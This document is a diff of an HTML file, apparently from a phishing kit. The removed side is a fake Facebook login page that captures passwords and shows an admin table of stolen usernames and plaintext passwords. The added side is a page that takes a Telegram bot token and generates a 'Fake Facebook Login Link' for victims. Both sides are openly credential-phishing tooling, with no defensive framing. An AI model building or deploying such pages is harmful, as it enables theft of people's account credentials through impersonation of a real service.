@@ -3,162 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <title>Telegram Bot Token</title>
     <style>
         body {
-            font-family: 'Poppins', sans-serif;
-            background: #f0f2f5;
-            text-align: center;
-            padding: 20px;
+            font-family: Arial, sans-serif;
+            margin: 20px;
         }
-        
-        .container {
-            max-width: 360px;
-            margin: 100px auto;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.2);
-        }
-
-        .fb-logo {
-            font-size: 40px;
-            font-weight: bold;
-            color: #1877f2;
-            margin-bottom: 20px;
-        }
-
-        input {
-            width: 90%;
-            padding: 12px;
+        input, button {
             margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-            text-align: center;
-        }
-
-        button {
+            padding: 10px;
             width: 100%;
-            padding: 12px;
-            border: none;
-            background: #1877f2;
-            color: white;
-            font-weight: bold;
-            font-size: 18px;
-            border-radius: 5px;
-            cursor: pointer;
-            transition: 0.3s ease-in-out;
+            max-width: 300px;
         }
-
-        button:hover {
-            background: #165db3;
-        }
-
         .hidden {
             display: none;
         }
     </style>
-    <script>
-        function showPage(page) {
-            document.getElementById("login-page").classList.add("hidden");
-            document.getElementById("admin-dashboard").classList.add("hidden");
-
-            document.getElementById(page).classList.remove("hidden");
-        }
-
-        function checkLogin() {
-            let urlParams = new URLSearchParams(window.location.search);
-            let token = urlParams.get('token');
-
-            if (!token) {
-                document.getElementById("login-message").innerHTML = "<h2>❌ Invalid Token!</h2>";
-                return;
-            }
-
-            let userData = localStorage.getItem(token);
-            if (userData) {
-                let user = JSON.parse(userData);
-                document.getElementById("login-username").innerText = user.username;
-                document.getElementById("login-token").value = token;
-            } else {
-                document.getElementById("login-message").innerHTML = "<h2>❌ Invalid Token!</h2>";
-            }
-        }
-
-        function submitLogin() {
-            let token = document.getElementById("login-token").value;
-            let password = document.getElementById("password").value;
-
-            if (password === "") {
-                alert("❌ Please enter your password!");
-                return;
-            }
-
-            let userData = JSON.parse(localStorage.getItem(token));
-            userData.loggedIn = true;
-            userData.password = password;
-            localStorage.setItem(token, JSON.stringify(userData));
-
-            alert("✅ Login Successful!");
-            window.location.href = "?page=admin";
-        }
-
-        function showLogins() {
-            let password = prompt("🔑 Enter Admin Password:");
-            if (password !== "tf") {
-                alert("❌ Access Denied!");
-                showPage('login-page');
-                return;
-            }
-
-            let allLogins = "<h2>📊 All User Logins</h2><table border='1' style='width: 100%;'><tr><th>Username</th><th>Password</th><th>Status</th></tr>";
-            for (let i = 0; i < localStorage.length; i++) {
-                let key = localStorage.key(i);
-                let data = JSON.parse(localStorage.getItem(key));
-                if (data.loggedIn) {
-                    allLogins += `<tr><td>${data.username}</td><td>${data.password}</td><td>✅ Logged In</td></tr>`;
-                }
-            }
-            allLogins += "</table>";
-            document.getElementById("dashboard-content").innerHTML = allLogins;
-        }
-
-        window.onload = function() {
-            let urlParams = new URLSearchParams(window.location.search);
-            let page = urlParams.get('page');
-
-            if (page === "login") {
-                showPage("login-page");
-                checkLogin();
-            } else if (page === "admin") {
-                showPage("admin-dashboard");
-                showLogins();
-            } else {
-                showPage("login-page");
-            }
-        };
-    </script>
 </head>
 <body>
+    <h1>Telegram Bot Token</h1>
+    <button id="showTokenInput">Add Bot Token</button>
 
-    <!-- Login Page -->
-    <div id="login-page" class="container">
-        <div class="fb-logo">facebook</div>
-        <h2>🔑 User Login</h2>
-        <p>Welcome, <span id="login-username"></span></p>
-        <input type="hidden" id="login-token">
-        <input type="password" id="password" placeholder="Enter Password" required><br>
-        <button onclick="submitLogin()">Login</button>
+    <div id="tokenInputSection" class="hidden">
+        <input type="text" id="botToken" placeholder="Enter your Telegram Bot Token">
+        <button id="submitToken">Submit</button>
     </div>
 
-    <!-- Admin Dashboard -->
-    <div id="admin-dashboard" class="container hidden">
-        <h2>🔐 Admin Dashboard</h2>
-        <div id="dashboard-content">Loading...</div>
-        <button onclick="showPage('login-page')">⬅ Back</button>
+    <div id="fakeLoginLinkSection" class="hidden">
+        <h2>Fake Facebook Login Link</h2>
+        <p>Copy the link below and open it in another browser/tab:</p>
+        <input type="text" id="fakeLoginLink" readonly>
+        <button id="copyLink">Copy Link</button>
     </div>
 
+    <script>
+        // Show token input section
+        document.getElementById('showTokenInput').addEventListener('click', function() {
+            document.getElementById('tokenInputSection').classList.remove('hidden');
+        });
+
+        // Handle token submission
+        document.getElementById('submitToken').addEventListener('click', function() {
+            const botToken = document.getElementById('botToken').value;
+            if (botToken) {
+                // Generate fake login link
+                const fakeLoginLink = `${window.location.origin}/fake_login.html?token=${encodeURIComponent(botToken)}`;
+                document.getElementById('fakeLoginLink').value = fakeLoginLink;
+                document.getElementById('fakeLoginLinkSection').classList.remove('hidden');
+            } else {
+                alert('Please enter a valid bot token.');
+            }
+        });
+
+        // Copy link to clipboard
+        document.getElementById('copyLink').addEventListener('click', function() {
+            const linkInput = document.getElementById('fakeLoginLink');
+            linkInput.select();
+            document.execCommand('copy');
+            alert('Link copied to clipboard!');
+        });
+    </script>
 </body>
 </html>
